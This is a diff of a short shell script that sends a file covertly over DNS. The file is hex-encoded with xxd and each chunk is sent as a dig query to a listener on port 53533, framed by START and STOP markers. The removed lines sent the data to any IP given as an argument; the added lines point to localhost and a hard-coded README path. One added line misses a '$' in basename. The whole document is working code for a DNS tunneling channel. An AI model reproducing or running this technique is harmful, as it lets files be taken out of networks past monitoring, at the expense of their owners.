@@ -2,20 +2,15 @@
 
 # File to emit
 
-ip=$1
-file_path=$2
+file_path=/home/anthony/Davidson/uncle-dav/uncle-dav-back/README.md
+file_name=$(basename file_path)
 
-id=$(date +%s)
+timestamp=$(date +%s)
+dig @localhost -p 53533 "START $timestamp" > /dev/null
 
-count=1
 
-xxd -ps -c 31 "$file_path" | while read hex; do
-  domain="$hex.$count.$id"
-  dig @"$ip" -p 53533 "$domain" +retry=1 +timeout=1 > /dev/null
-  count=$((count + 1))
+xxd -ps -c 16 "$file_path" | while read hex; do
+  dig @localhost -p 53533 "$hex" > /dev/null
 done
 
-dig @"$ip" -p 53533 "STOP.0.$id" > /dev/null
-
-echo "File sent"
-
+dig @localhost -p 53533 "STOP $timestamp" > /dev/null
